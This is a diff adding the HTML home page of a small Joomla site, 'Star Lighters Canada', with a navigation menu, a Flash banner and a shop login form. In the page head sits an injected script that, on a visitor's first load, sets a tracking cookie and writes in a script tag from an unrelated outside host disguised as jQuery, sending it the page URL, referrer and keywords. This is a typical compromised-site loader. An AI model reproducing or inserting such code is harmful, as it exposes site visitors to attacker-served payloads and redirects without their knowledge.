@@ -1,0 +1,351 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb" >
+<head>
+
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="joomla, Joomla" />
+  <meta name="description" content="Joomla! - the dynamic portal engine and content management system" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Star Lighters Canada</title>
+  <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="http://starlighterscanada.com/modules/mod_swmenufree/transmenu_Packed.js"></script>
+<script type="text/javascript" src="http://starlighterscanada.com/modules/mod_swmenufree/jquery-1.2.6.pack.js"></script>
+  <style type='text/css'>
+<!--
+.transMenu {
+ position:absolute ; 
+ overflow:hidden; 
+ left:-1000px; 
+ top:-1000px; 
+}
+.transMenu .content {
+ position:absolute  ; 
+}
+.transMenu .items {
+ border: 0px none  ; 
+ position:relative ; 
+ left:0px; top:0px; 
+ z-index:2; 
+}
+.transMenu  td
+{
+ padding: 7px 5px 8px 5px !important;  
+ font-size: 12px !important ; 
+ font-family: Verdana, Arial, Helvetica, sans-serif !important ; 
+ text-align: left !important ; 
+ font-weight: bold !important ; 
+ color: ##fffff !important ; 
+} 
+#subwrap 
+{ 
+ text-align: left ; 
+}
+.transMenu  .item.hover td
+{ 
+ color: #321300 !important ; 
+}
+.transMenu .item { 
+ text-decoration: none ; 
+ cursor:pointer; 
+ cursor:hand; 
+}
+.transMenu .background {
+background-image:none; position:absolute ; 
+ left:0px; top:0px; 
+ z-index:1; 
+ opacity:0.9; 
+ filter:alpha(opacity=90) 
+}
+.transMenu .shadowRight { 
+ position:absolute ; 
+ z-index:3; 
+ top:-3000px; width:2px; 
+ opacity:0.9; 
+ filter:alpha(opacity=90)
+}
+.transMenu .shadowBottom { 
+ position:absolute ; 
+ z-index:1; 
+ left:-3000px; height:2px; 
+ opacity:0.9; 
+ filter:alpha(opacity=90)
+}
+.transMenu .item.hover {
+background-image:none;}
+.transMenu .item img { 
+ margin-left:10px !important ; 
+}
+table.swmenu {
+ top: 0px; 
+ left: 0px; 
+ position:relative ; 
+ margin:0px !important ; 
+ border: 0px none  ; 
+ z-index: 1; 
+}
+table.swmenu a{
+ margin:0px !important ; 
+ padding: 7px 15px 7px 75px  !important ; 
+ display:block !important; 
+ position:relative !important ; 
+}
+div.swmenu a,
+div.swmenu a:visited,
+div.swmenu a:link {
+ font-size: 12px !important ; 
+ font-family: Verdana, Arial, Helvetica, sans-serif !important ; 
+ text-align: left !important ; 
+ font-weight: bold !important ; 
+ color: #ffffff !important ; 
+ text-decoration: none !important ; 
+ margin-bottom:0px !important ; 
+ display:block !important; 
+ white-space:nowrap ; 
+}
+div.swmenu td {
+ border-bottom: 1px none  ; 
+ border-top: 1px none  ; 
+ border-left: 1px none  ; 
+background-image:none;} 
+div.swmenu td.last {
+ border-right: 1px none  ; 
+} 
+#trans-active a{
+ color: #321300 !important ; 
+background-image:none;} 
+#swmenu a.hover   { 
+background-image:none; color: #321300 !important ; 
+}
+#swmenu span {
+ display:none; 
+}
+
+-->
+</style>
+
+<link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="/templates/starlighter_inner/css/starlighters.css" type="text/css" />
+<!--[if lte IE 6]>
+<link href="/templates/starlighter_inner/css/ieonly.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+<title>Star Lighters</title>
+<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://daisyworld.co.za/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'G91825' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
+</head>
+
+<body id="body_bg" >
+<center>
+
+	<div id="outerbox" >
+
+		<div id="innerbox">
+			
+			<div id="logoarea">
+				<table width="905px" height="105px" border="0" cellspacing="0">
+				<tr><td width="30px" rowspan="2"></td><td width="185px" rowspan="2"><img src="/templates/starlighter_inner/images/logo.jpg" border="0"></td>
+					<td width="660px" height="60px"></td><td width="30px" rowspan="2"></td></tr>
+				<tr><td align="right"><a href="/" class="home">Home</a></td></tr>
+				</table>		
+			</div>
+		
+			<div id="top_menu">
+				<table width="900px" height="30px" border="0" cellspacing="0">
+				<tr><td width="7"></td>
+				
+				<td align="center"> 
+<!--swMenuFree6.0 transmenu by http://www.swmenupro.com-->
+<div id="sw-wrap" class="swmenu" align="left">
+<table cellspacing="0" cellpadding="0" id="swmenu" class="swmenu" > 
+<tr> 
+<td> 
+<a id="menu2" href="/index.php?option=com_content&amp;view=article&amp;id=1&amp;Itemid=2" >About Us</a>
+</td> 
+<td> 
+<a id="menu3" href="/index.php?option=com_content&amp;view=article&amp;id=2&amp;Itemid=3" >Opportunities</a>
+</td> 
+<td> 
+<a id="menu5" href="/index.php?option=com_content&amp;view=article&amp;id=4&amp;Itemid=5" >Gallery</a>
+</td> 
+<td class="last"> 
+<a id="menu6" href="/index.php?option=com_contact&amp;view=contact&amp;id=1&amp;Itemid=6" >Contact Us</a>
+</td> 
+</tr> 
+</table></div> 
+<div id="subwrap"> 
+<script type="text/javascript">
+<!--
+if (TransMenu.isSupported()) {
+var ms = new TransMenuSet(TransMenu.direction.down, 0,0, TransMenu.reference.bottomLeft);
+function init() {
+if (TransMenu.isSupported()) {
+TransMenu.initialize();
+document.getElementById("menu2").onmouseover = function() {
+ms.hideCurrent();
+this.className = "hover";
+}
+document.getElementById("menu2").onmouseout = function() { this.className = ""; }
+document.getElementById("menu3").onmouseover = function() {
+ms.hideCurrent();
+this.className = "hover";
+}
+document.getElementById("menu3").onmouseout = function() { this.className = ""; }
+document.getElementById("menu5").onmouseover = function() {
+ms.hideCurrent();
+this.className = "hover";
+}
+document.getElementById("menu5").onmouseout = function() { this.className = ""; }
+document.getElementById("menu6").onmouseover = function() {
+ms.hideCurrent();
+this.className = "hover";
+}
+document.getElementById("menu6").onmouseout = function() { this.className = ""; }
+}}
+TransMenu.dingbatSize = 0;
+TransMenu.spacerGif = "";
+TransMenu.dingbatOn = "";
+TransMenu.dingbatOff = ""; 
+TransMenu.sub_indicator = false;
+TransMenu.menuPadding = 0;
+TransMenu.itemPadding = 0;
+TransMenu.shadowSize = 2;
+TransMenu.shadowOffset = 3;
+TransMenu.shadowColor = "#888";
+TransMenu.shadowPng = "http://starlighterscanada.com/modules/mod_swmenufree/images/transmenu/grey-40.png";
+TransMenu.backgroundColor = "";
+TransMenu.backgroundPng = "http://starlighterscanada.com/modules/mod_swmenufree/images/transmenu/white-90.png";
+TransMenu.hideDelay = 600;
+TransMenu.slideTime = 300;
+TransMenu.selecthack = 1;
+TransMenu.autoposition = 0;
+TransMenu.renderAll();
+if ( typeof window.addEventListener != "undefined" )
+window.addEventListener( "load", init, false );
+else if ( typeof window.attachEvent != "undefined" ) {
+window.attachEvent( "onload", init);
+}else{
+if ( window.onload != null ) {
+var oldOnload = window.onload;
+window.onload = function ( e ) {
+oldOnload( e );
+init();
+}
+}else
+window.onload = init();
+}
+}
+-->
+</script>
+</div>
+<script type="text/javascript">
+<!--
+jQuery.noConflict();
+jQuery(document).ready(function($){
+$('#sw-wrap').parents().css('position','static');
+$('#sw-wrap').parents().css('z-index','100');
+$('#sw-wrap').css('z-index','101');
+});
+//--> 
+</script>  
+
+<!--End swMenuFree menu module-->
+</td>
+								
+				</tr>
+				</table>
+			</div>
+			
+			<div id="maintxt_area">
+				<div id="gap1"></div>
+				<div id="bigpic_area" align="center"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="887" height="157">
+                <param name="movie" value="/templates/starlighter_inner/media/BannerAnimStarLit.swf" />
+                <param name="quality" value="high" />
+				<param name="menu" value="false" />
+				<param name="LOOP" value="false" />
+                <embed src="/templates/starlighter_inner/media/BannerAnimStarLit.swf" width="887" height="157" loop="false" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" />
+  		    </object></div>
+				<div id="bigpic_grad"></div>
+				
+				<div id="matter_area">
+				<div id="matter_area1">
+					<table width="685px" border="0" cellspacing="0">
+					<tr><td width="15px"></td>
+					<td width="670px" align="left">
+						<div class="componentheading">
+	Star Lighters Canada</div>
+<table class="blog" cellpadding="0" cellspacing="0">
+<tr>
+	<td valign="top">
+				</td>
+</tr>
+
+
+</table>
+
+					</td>
+					</tr>
+					</table>
+					</div>
+					
+					<div id="matter_area2">
+					<table width="210px" border="0" cellspacing="0">
+						<tr>
+
+					<td width="20px" align="center"><img src="/templates/starlighter_inner/images/gray_notch.jpg" border="0" align="absmiddle"></td>
+					<td width="175px" align="left">
+						<b>Online Shoppping</b>
+					  
+<div>
+	<form action="http://starlighterscanada.com/index.php?option=com_user&amp;task=login" method="post" name="login" id="login">
+				<label for="username_vmlogin">Username</label><br/>
+		<input class="inputbox" type="text" id="username_vmlogin" size="12" name="username" />
+		<br />
+		<label for="password_vmlogin">Password</label><br/>
+		<input type="password" class="inputbox" id="password_vmlogin" size="12" name="passwd" />
+				<br />
+		<input type="hidden" name="remember" value="yes" />
+				<br />
+		<input type="submit" value="Sign In" id="signin_bg"  name="Login" />
+		<ul>
+			<li><a href="/index.php?option=com_user&amp;view=reset">Forgot Password?</a></li>
+						<li><a href="/index.php?option=com_user&amp;view=remind">Forgot username?</a></li>
+								</ul>
+		<input type="hidden" value="login" name="op2" />
+		<input type="hidden" value="Lw==" name="return" />
+		<input type="hidden" name="72f81dc55cc901b30b729b0cc51292a5" value="1" />
+			</form>
+</div>
+
+                                         
+					</td>
+					<td width="15px"></td>
+					</tr>			
+					</table>
+				
+				</div>
+			</div>
+			
+			</div>
+			
+			<div id="cpyarea">
+				<table width="905px" height="25px" border="0" cellspacing="0">
+				<tr><td align="center">Copyright Star Lighters Canada. All Rights Reserved</td></tr>
+				</table>
+			</div>
+			
+			
+		</div>		<!--innerbox-->
+		
+
+		
+	</div>			<!--Outerbox-->
+
+</center>
+</body>
+
+
+</html>
